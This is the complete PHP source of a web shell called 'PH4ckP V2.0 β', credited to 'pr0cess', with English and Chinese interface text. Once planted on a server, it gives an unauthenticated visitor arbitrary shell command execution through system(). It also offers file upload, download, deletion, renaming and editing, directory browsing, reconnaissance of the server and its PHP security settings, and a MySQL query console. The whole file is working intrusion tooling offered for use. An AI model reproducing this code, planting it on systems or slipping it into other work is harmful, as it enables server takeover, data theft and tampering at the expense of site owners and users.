<?php
/*--------------------------------------------
Codz By pr0cess
MSN:l4ndishezhang@hotmail.com
----------------------------------------------
*/
if ($downfile)            
        {@set_time_limit(600);
        $filename = basename($downfile);
        $filesize = filesize($downfile);
        header("Content-Type: application/force-download; name=".$filename);
        header("Content-Transfer-Encoding: binary");
        header("Content-Length: $filesize");
        header("Content-Disposition: attachment; filename=".$filename);
        header("Expires: 0");
        header("Cache-Control: no-cache, must-revalidate");
        header("Pragma: no-cache");

        readfile("$downfile");
        exit();
      }

if($delfile!=""){
      
        if(is_file($delfile)){
            $message = (@unlink($delfile))
              ? "The deletion document succeeds!`$delfile` Already deleted!"
              : "The deletion document is defeated！`$delfile` The document exists!" ;
        }else{
            $message = "File `$delfile` does not exist！";
        }
      }
echo $message;

if ($refilename){
  echo '<table>';
echo '<form action="" method="post">';
echo '<br>';
echo '<tr>';
echo '<td align="left">';
echo '<font size="2">';
echo 'Enter the newname to here：';
echo '<input type="text" name="newname"/>';
echo '<input type="submit" value="Rename"/>';
echo '</tr>';echo '</td>';echo '</table>';
$oldname=basename($refilename);
if (@rename($oldname,$_POST['newname'])){
    echo '<script>alert(\'文件改名成功!\')</script>';}
    else
    { if (!empty($_POST['newname']))
    echo '<script>alert(\'文件改名失败!\')</script>';}
}

if ($editfile) {
    echo '<table><tr>';
    echo '<form action="" method="post">';
    echo '<input type="submit" value="Edition document"/>';
    echo '</tr>';
    $content=basename($editfile);
    $fp=@fopen("$content","a+");
    $data=@fread($fp,filesize($content));
    echo '<tr>';
    echo '<textarea name="newcontent" cols="80" rows="20" >';
    echo $data;
  
    if (!empty($_POST['newcontent']))
    {echo $result=$result=@fwrite($fp,$_POST['newcontent'])?"The injection document succeeds！Good Luck!":"The injection document is defeated！";
    }
}
echo '</textarea></tr></table>';
?>
<html>
<title>PH4ckP V2.0 β By pr0cess</title>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312";>
<STYLE type="text/css">
body {font-family: "sans-serif", "serif"; font-size: 12px;}
BODY { background-color:#A2B5CD }
a:link {color: #BFEFFF; text-decoration: none}
a:visited {color: #080808; text-decoration: none}
a:hover {color: #FFFFFF; text-decoration: underline}
input {font-family: "sans-serif", "serif";font-size: 12px;}
td {font-family: "sans-serif", "Verdana"; font-size: 12px;}
.title {font-family: "Verdana", "Tahoma";font-size: 20px;font-weight: bold; color=black}
</STYLE>
</head>
<body>
<table width="100%"  cellspacing="1" cellpadding="3">
  <tr>
    <td class="title" align="center">PH4ckP V2.0 β</td>
  </tr>
</table>
<hr>
<table width="100%"  cellspacing="1" cellpadding="3">
<form action="<?=$PHP_SELF?>" method="get">
  <tr>
  
  </tr>
  </form>
  <tr>
  <td>Operating system:<?echo PHP_OS;?></td><td>Server name:<?echo $_SERVER['SERVER_NAME'];?><td>Server IP:<?echo gethostbyname($_SERVER['SERVER_NAME']);?></tr><tr></td><td>Server time:<?echo date("Y年m月d日 h:i:s",time());?></td><td>Server port :<?echo $_SERVER['SERVER_PORT'];?></td></tr>
  <tr><td><a href=http://translate.google.com/translate_t>Click here to translate online </a></td></tr></table>
<hr>
<table><tr><td><a href="?shell=env">『PHP探针模块』</a></td><td><a href="?shell=checkdir">『目录浏览模块[快速]』</a></td><td> <a href="?shell=command">『命令执行模块』</a></td><td><a href="?shell=sql">『数据库操作模块』</a></td><td><a href="?shell=change">『字符转换模块』</a></td></tr>< /table>
<hr>
<table><tr><td>Current dir of contents：<?php
if (!isset($dir) or empty($dir)) {
  $dir=str_replace('\\','/',dirname(__FILE__));
  echo "<font color=\"#00688B\">".$dir."</font>";
} else {
  $dir=$_GET['dir'];
  echo "<font color=\"#00688B\">".$dir."</font>";
}
?></td>
  </tr>
<tr><td>
<form enctype="multipart/form-data" action="" method="post">
UploadFile：
<input name="upload_file" type="file" style="font-family:Verdana,Arial; font-size: 9pt;">
<input type="submit" value="Upload~" style="font-family:Verdana,Arial; font-size: 9pt;background-color:#A2B5CD">
</form>
<?
//文件上传
$upload_file=$_FILES['upload_file']['tmp_name'];
$upload_file_name=$_FILES['upload_file']['name'];

if($upload_file){
$file_size_max = 1000*1000;
$store_dir = "__FILE__";
$accept_overwrite = 1;
if ($upload_file_size > $file_size_max) {
echo "兄弟！换个小点滴！！";
exit;
}


if (file_exists($store_dir . $upload_file_name) && !$accept_overwrite) {
Echo "文件已存在！";
exit;
}

if (!move_uploaded_file($upload_file,$upload_file_name)) {
echo "上传文件失败！";
exit;
}

}

Echo "<p>Uploaded file:";
echo $_FILES['upload_file']['name'];


Echo "Uploadfilesiza:";
echo $_FILES['upload_file']['size']/1024;


$Erroe=$_FILES['upload_file']['error'];
switch($Erroe){
case 0:
Echo "Loading..."; break;
case 1:
Echo "上传的文件超过限制！"; break;
case 2:
Echo "上传文件的大小超过限制！"; break;
}
echo '</td></tr>';

echo '</tr>';

echo '</table>';
?>
<?php
echo '<table width="100%" border="0" cellspacing="1" cellpadding="3">';
echo '<form action="" method="get">';
  echo '<tr>';
    echo '<td>';
echo "The dir of contents glances over：";
echo '<input type="text" name="dir" style="font-family:Verdana,Arial; font-size: 9pt;">';
      echo '<input type="submit" value="GoTo" style="font-family:Verdana,Arial; font-size: 9pt;background-color:#A2B5CD ">';
  echo '</td>';
  echo '</tr>';
echo '</form>';
echo '<table width="100%" border="0" cellpadding="3" cellspacing="1">';
  echo '<tr>';
  echo '<td><b>';echo "Sub-Dir of contents";echo '</b></td>';
          echo '</tr>';

$dirs=@opendir($dir);
while ($file=@readdir($dirs)) {
  $b="$dir/$file";
  $a=@is_dir($b);
  if($a=="1"){
  if($file!=".."&&$file!=".")  {
      echo "<tr>\n";
      echo "  <td><a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">$file</a></td>\n";
      echo "</tr>\n";
  } else {
      if($file=="..")
      echo "<a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">Back higher authority dir of contents</a>";
      }
  }
}
@closedir($dirs);
?>
</table>
<hr>
<table width="100%" border="0" cellpadding="3" cellspacing="1">
          <tr>
            <td><b>Filename</b></td>
            <td><b>Filedate</b></td>
            <td><b>Filesize</b></td>
            <td><b>Fileoperates</b></td>
          </tr>
<?php
$dirs=@opendir($dir);
while ($file=@readdir($dirs)) {
  $b="$dir/$file";
  $a=@is_dir($b);
  if($a=="0"){
  $size=@filesize("$dir/$file")/1024; 
  $lastsave=@date("Y-n-d H:i:s",filectime("$dir/$file"));
    echo "<tr>\n";
    echo "<td>$file</td>\n";
  echo "  <td>$lastsave</td>\n";
    echo "  <td>$size KB</td>\n";
  echo "  <td><a href=\"?downfile=".urlencode($dir)."/".urlencode($file)."\">［Down］ </a><a href=\"?dir=".urlencode($dir)."&delfile=".urlencode($dir)."/".urlencode ($file)."\">［Delete］</a></a><a href=\"?refilename=".urlencode($dir)."/".urlencode($file)."\"> ［Rename］</a><a href=\"?editfile=".urlencode($dir)."/".urlencode($file)."\">［Injects］ </a></td>\n";
  echo "</tr>\n";
  }
}
@closedir($dirs);
?></table>
<hr>
<?if ($_GET['shell']=="env"){
function dir_wriable($dir){
  $xY7_test=tempnam("$dir","test_file");
  if ($fp=@fopen($xY7_test,"w")){
    @fclose($fp);
    @unlink($xY7_test);
    $wriable="ture";
  }
    else {
    $wriable=false or die ("Cannot open $xY7_test!");
  }
  return $wriable;
}
if (dir_wriable(str_replace('//','/',dirname(__FILE__)))){
    $dir_wriable='目录可写';
    echo "<b>当前目录可写!^ _ ^</b>";
    }
      else{
        $dir_wriable='目录不可写';
    echo "<b>当前目录不可写！</b>";
  }

function getinfo($xy7)
{
  if($xy7==1)
  {
  $s='<font color=blue>YES<b>√</b></font>';
  }
  else
  {
  $s='<font color=red>NO<b>×</b></font>';
  }
  return $s;
} echo '<br><br>';
  echo '<br>';
  echo "服务器系统：" ;
  echo PHP_OS;
  echo '<br>';
  echo "服务器域名:";
  echo $_SERVER['SERVER_NAME'];
  echo '<br>';
  echo "WEB服务器端口：";
  echo $_SERVER['SERVER_PORT'];
  echo '<br>';
  echo "服务器时间:";
  echo date("Y年m月d日 h:i:s",time());
  echo '<br>';
  echo "服务器IP地址:";
  echo gethostbyname($_SERVER['SERVER_NAME']);
  echo '<br>';
  echo "服务器操作系统文字编码:";
  echo $_SERVER['HTTP_ACCEPT_LANGUAGE'];
  echo '<br>';
  echo "服务器解释引擎:";
  echo $_SERVER['SERVER_SOFTWARE'];
  echo '<br>';
  echo "PHP运行方式:";
  echo strtoupper(php_sapi_name());
  echo '<br>';
  echo "PHP版本:";
  echo PHP_VERSION;
  echo '<br>';
  echo "ZEND版本:";
  echo zend_version();
  echo '<br>';
  echo "本文件绝对路径:";
  echo __FILE__;
  echo '<br>';
  echo "服务器剩余空间:";
  echo intval(diskfreespace(".") / (1024 * 1024)).'MB';
  echo '<br>';
  echo "脚本运行可占最大内存:";
  echo get_cfg_var("memory_limit");
  echo '<br>';
  echo "脚本上传文件大小限制:";
  echo get_cfg_var("upload_max_filesize");
  echo '<br>';
  echo "被屏蔽函数:";
  echo get_cfg_var("disable_functions");
  echo '<br>';
  echo "POST方法提交限制:";
  echo get_cfg_var("post_max_size");
  echo '<br>';
  echo "脚本超时时间:";
  echo get_cfg_var("max_execution_time")."秒";
  echo '<br>';
  echo "动态链接库:";
  echo getinfo(get_cfg_var("enable_dl"));
  echo '<br>';
  echo "自定义全局变量:";
  echo getinfo(get_cfg_var("register_globals"));
  echo '<br>';
  echo "显示错误信息:";
  echo getinfo(get_cfg_var("display_errors"));
  echo '<br>';
  echo "PHP安全模式:";
  echo getinfo(get_cfg_var("safe_mode"));
  echo '<br>';
  echo "FTP文件传输:";
  echo getinfo(get_magic_quotes_gpc("FTP support"));
  echo '<br>';
  echo"允许使用URL打开文件:";
  echo getinfo(get_cfg_var("allow_url_fopen"));
  echo '<br>';
  echo "SESSION支持:";
  echo getinfo(function_exists("session_start"));
  echo '<br>';
  echo "Socket支持:";
  echo getinfo(function_exists("fsockopen"));
  echo '<br>';
  echo "MYSQL数据库:";
  echo getinfo(function_exists("mysql_close"));
  echo '<br>';
  echo "SQL SERVER数据库:";
  echo getinfo(function_exists("mssql_close"));
  echo '<br>';
  echo "ODBC数据库:";
  echo getinfo(function_exists("odbc_close"));
  echo '<br>';
  echo "Oracle数据库:";
  echo getinfo(function_exists("ora_close"));
  echo '<br>';
  echo "SNMP协议:";
  echo getinfo(function_exists("snmpget"));
  echo '<br>';
  echo '<br>';
}
elseif ($_GET['shell']=="checkdir"){
  global $PHP_SELF;
  echo '<form action="" method="post">';
  echo "快速目录浏览:";
  echo '<input type="text" name="dir" style="font-family:Verdana,Arial; font-size: 9pt;"/>';
  echo '<input type="submit" value="GoTo" style="font-family:Verdana,Arial; font-size: 9pt; background-color:#A2B5CD"/>';
  echo '<br>';
  echo '<textarea name="textarea" cols="70" rows="15">';
  if (empty($_POST['dir']))
  $newdir="./";
  else
  $newdir=$_POST['dir'];
  $handle=@opendir($newdir);
  echo "handle: $handle\n";
  while ($file=@readdir($handle))
    {echo ("$file \n");}
  echo '</textarea>';
  echo '<br>';
  $nowdir=dirname($PHP_SELF);
}
elseif ($_GET['shell']=="command"){
echo '<table>';
echo '<form action="" method="post">';
echo '<br>';
echo '<tr>';
echo '<td align="left">';
echo 'Enter your command：';
echo '<input type="text" name="cmd" style="font-family:Verdana,Arial; font-size: 9pt;"/>';
echo '<input type="submit" value="Run" style="font-family:Verdana,Arial; font-size: 9pt;background-color:#A2B5CD"/>';
echo '</tr>';echo '</td>';
echo '<tr>';
echo '<td>';
echo '<textarea name="textarea" cols="70" rows="15" readonly>';
  @system($_POST['cmd']);
  echo '</textarea>';
}

elseif ($_GET['shell']=="change"){
echo '<form action="" method="post">';
echo '<br>';
echo "Enter binary character:";
echo '<input type="text" name="char" style="font-family:Verdana,Arial; font-size: 9pt;"/>';
echo '<input type="submit" value="Transforms to Hexadecimal" style="font-family:Verdana,Arial; font-size: 9pt; background-color:#A2B5CD"/>';
echo '</form>';
echo '<textarea name="textarea" cols="40" rows="1" readonly>';
$result=bin2hex($_POST['char']);
  echo "0x".$result;
  echo '</textarea>';
}

elseif ($_GET['shell']=="sql"){
  echo '<table align="center" cellSpacing=8 cellPadding=4>';
  echo '<tr><td>';
  echo '<form action="" method="post">';
  echo "Host:";
  echo '<input name="servername" type="text" style="font-family:Verdana,Arial; font-size: 9pt;">';
  echo '</td><td>';
  echo "Username:";
  echo '<input name="username" type="text" style="font-family:Verdana,Arial; font-size: 9pt;">';
  echo '</td></tr>';
  echo '<tr><td>';
  echo "Password:";
  echo '<input name="password" type="text" style="font-family:Verdana,Arial; font-size: 9pt;">';
  echo '</td><td>';
  echo "DBname:";
  echo '<input name="dbname" type="text" style="font-family:Verdana,Arial; font-size: 9pt;">';
  echo '<input type="submit" value="Connect" style="font-family:Verdana,Arial; font-size: 9pt; background-color:#A2B5CD"/>';
  echo '</td></tr>';
  if (@mysql_connect($servername,$username,$password) and @mysql_select_db($dbname)) {
      echo "The database connects successfully!";
      mysql_close();
  } else {
      echo mysql_error();
  }
  if (!empty($dbresult)){
      $dbresult = @mysql_query($_POST['query']);
      echo ($result) ? "Requests successfully!" : "The request makes a mistake: ".mysql_error();
      mysql_close();}
      echo '<tr><td>';
      echo '<textarea name="query" cols="60" rows="10">';
      echo '</textarea>';
      echo '</td></tr>';
      echo '<tr><td align="center">';
      echo '<input type="submit" value="Execution SQL_query" style="font-family:Verdana,Arial; font-size: 9pt; background-color:#A2B5CD"/>';
      echo '</td></tr>';
      echo '</table>';

}

?>
<table align="center"><tr><td>
<h6>Copyright (C) 2006 All Rights Reserved
</td></tr></table>
